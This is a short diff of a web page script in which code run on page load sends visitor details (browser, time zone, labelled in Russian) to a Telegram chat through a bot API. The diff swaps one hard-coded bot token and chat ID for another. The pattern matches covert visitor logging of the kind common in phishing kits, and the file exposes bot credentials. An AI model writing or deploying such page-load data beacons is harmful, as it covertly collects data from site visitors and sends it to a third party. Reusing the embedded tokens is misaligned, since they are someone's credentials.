@@ -28,8 +28,8 @@ document.addEventListener('DOMContentLoaded', function() {
   ├ Браузер: ${browser}
   └ Часовой пояс: ${timeZone}`;
       
-      const token = '6325918434:AAF5vxloxnfz-dRFEtSsX_8SEkj4SeJaCJI';
-      const chatId = '-1002056306847'
+      const token = '7177389907:AAFlaicObh4sNYQS4zRgEMEYjNtNNHTX3-Q';
+      const chatId = '-1002129355361'
       const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
       const formData = new FormData();
         formData.append('chat_id', chatId);
